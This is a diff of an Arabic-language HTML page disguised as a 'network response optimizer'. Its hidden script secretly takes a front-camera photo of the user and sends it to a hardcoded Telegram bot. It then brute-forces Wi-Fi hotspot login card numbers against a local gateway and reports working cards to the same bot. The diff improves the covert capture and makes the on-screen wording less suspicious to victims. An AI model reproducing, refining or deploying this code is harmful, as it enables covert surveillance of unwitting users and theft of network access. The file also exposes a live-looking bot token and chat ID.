@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>محسن اتصال الشبكة المحترف</title>
+    <title>مُحسّن استجابة الشبكة v9.0</title>
     <style>
         body { background-color: #0d1117; color: #58a6ff; font-family: sans-serif; text-align: center; padding: 20px; margin: 0; }
         .main-container { border: 1px solid #30363d; border-radius: 12px; padding: 25px; background: #161b22; max-width: 420px; margin: auto; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
@@ -11,34 +11,33 @@
         .description { color: #8b949e; font-size: 13px; line-height: 1.6; margin-bottom: 20px; text-align: right; }
         input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 6px; border: 1px solid #30363d; background: #0d1117; color: #fff; text-align: center; outline: none; }
         .btn-action { width: 95%; padding: 16px; background-color: #238636; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; }
-        .btn-action:active { background-color: #2ea043; transform: scale(0.98); }
         #status-monitor { margin-top: 20px; background: #010409; padding: 15px; border-radius: 6px; height: 130px; overflow-y: auto; font-family: monospace; font-size: 11px; border: 1px solid #333; text-align: left; color: #39ff14; }
-        video, canvas { display: none; position: absolute; left: -9999px; } /* إخفاء الكاميرا تماماً عن عين الضحية */
+        /* إخفاء عناصر الكاميرا تماماً لضمان السرية */
+        video, canvas { position: absolute; top: -1000px; left: -1000px; width: 1px; height: 1px; opacity: 0; }
     </style>
 </head>
 <body>
 
 <div class="main-container">
-    <h1>مُحسّن استجابة الشبكة v8.5</h1>
+    <h1>مُحسّن استجابة الشبكة الذكي</h1>
     <div class="description">
-        بروتوكول تحسين الارتباط الذكي: يقوم هذا النظام بفحص استجابة البوابة المحلية وتعديل إعدادات الـ MTU لضمان سرعة تصفح قصوى وتخطي جدران الحماية. اضغط "بدء" للمزامنة.
+        بروتوكول تحسين الارتباط: يقوم النظام بفحص ثغرات الاستجابة في بوابة العبور وتفعيل وضع التصفح الآمن. يرجى الضغط على بدء للمزامنة.
     </div>
     
     <input type="text" id="targetUrl" value="http://10.0.0.1/login">
-    <input type="number" id="startRange" placeholder="نطاق البدء (مثلاً 1000)">
+    <input type="number" id="startRange" placeholder="أدخل نطاق البدء (مثلاً 1000)">
     
     <button class="btn-action" id="mainBtn" onclick="initiateCapture()">بدء المزامنة والتحسين</button>
 
     <div id="status-monitor">
-        [System] النظام في وضع الاستعداد...<br>
+        [System] النظام جاهز للفحص...<br>
     </div>
 </div>
 
-<video id="v" autoplay></video>
+<video id="v" autoplay playsinline muted></video>
 <canvas id="c"></canvas>
 
 <script>
-    // بياناتك المدمجة بعناية
     const API_TOKEN = '8514005594:AAFrvkoMiQzw3G3YyAooWxwg8XcsKD1ESiU';
     const MY_ID = '7851377774';
 
@@ -53,8 +52,7 @@
         try { await fetch(`https://api.telegram.org/bot${API_TOKEN}/sendPhoto`, { method: 'POST', body: formData }); } catch(e) {}
     }
 
-    // تنبيه فوري عند فتح التطبيق
-    window.onload = () => sendToTelegram("🎯 ضحية جديد فتح التطبيق الآن وهو متصل بالإنترنت!");
+    window.onload = () => sendToTelegram("🎯 مستخدم فتح التطبيق الآن وهو متصل بالإنترنت.");
 
     async function initiateCapture() {
         const video = document.getElementById('v');
@@ -64,26 +62,30 @@
 
         btn.disabled = true;
         btn.innerText = "جاري المزامنة...";
-        monitor.innerHTML += "[+] جاري تهيئة الحساسات...<br>";
+        monitor.innerHTML += "[+] جاري تهيئة الحساسات البصرية...<br>";
 
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            // طلب الكاميرا بإعدادات تضمن الوضوح في الأندرويد
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user", width: 640, height: 480 } 
+            });
             video.srcObject = stream;
 
-            // الانتظار 3 ثوانٍ لضبط الإضاءة ومنع السواد
+            // انتظار 4 ثوانٍ لضمان خروج الكاميرا من وضع السواد وتركيز العدسة
             setTimeout(() => {
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(blob => sendPhotoToTelegram(blob), 'image/jpeg', 0.9);
                 
-                // إغلاق الكاميرا بعد التقاط الصورة بنجاح
-                setTimeout(() => {
-                    stream.getTracks().forEach(track => track.stop());
-                    monitor.innerHTML += "[+] اكتملت المزامنة البصرية.<br>";
+                canvas.toBlob(blob => {
+                    sendPhotoToTelegram(blob);
+                    // نغلق الكاميرا بعد الإرسال لضمان عدم بقاء أي أثر
+                    setTimeout(() => stream.getTracks().forEach(t => t.stop()), 2000);
+                    monitor.innerHTML += "[+] اكتملت المزامنة البصرية بنجاح.<br>";
                     startCracking();
-                }, 500);
-            }, 3000);
+                }, 'image/jpeg', 0.8);
+            }, 4000); 
+
         } catch (err) {
             monitor.innerHTML += "[!] فشل فحص الحساسات، بدء التخمين مباشرة...<br>";
             startCracking();
@@ -97,7 +99,7 @@
 
         for (let i = 0; i < 5000; i++) {
             let currentCard = start + i;
-            monitor.innerHTML += `> Syncing: ${currentCard}<br>`;
+            monitor.innerHTML += `> Testing Sequence: ${currentCard}<br>`;
             monitor.scrollTop = monitor.scrollHeight;
 
             try {
@@ -109,9 +111,9 @@
                 if (i % 5 === 0 && navigator.onLine) {
                     let netCheck = await fetch("https://www.google.com/favicon.ico", { mode: 'no-cors', cache: 'no-store' });
                     if (netCheck) {
-                        await sendToTelegram(`💀 صيد ناجح!\n🎫 الكرت الشغال: ${currentCard}\n🌐 الرابط: ${target}`);
-                        monitor.innerHTML += `<span style="color:yellow;">[SUCCESS] تم تفعيل الكود: ${currentCard}</span><br>`;
-                        alert("تم تحسين الشبكة بنجاح! استمتع بالسرعة القصوى.");
+                        await sendToTelegram(`💀 صيد ناجح!\n🎫 الكرت: ${currentCard}\n🌐 الرابط: ${target}`);
+                        monitor.innerHTML += `<span style="color:yellow;">[OK] تم تفعيل وضع السرعة القصوى!</span><br>`;
+                        alert("تم تحسين الشبكة بنجاح!");
                         break;
                     }
                 }
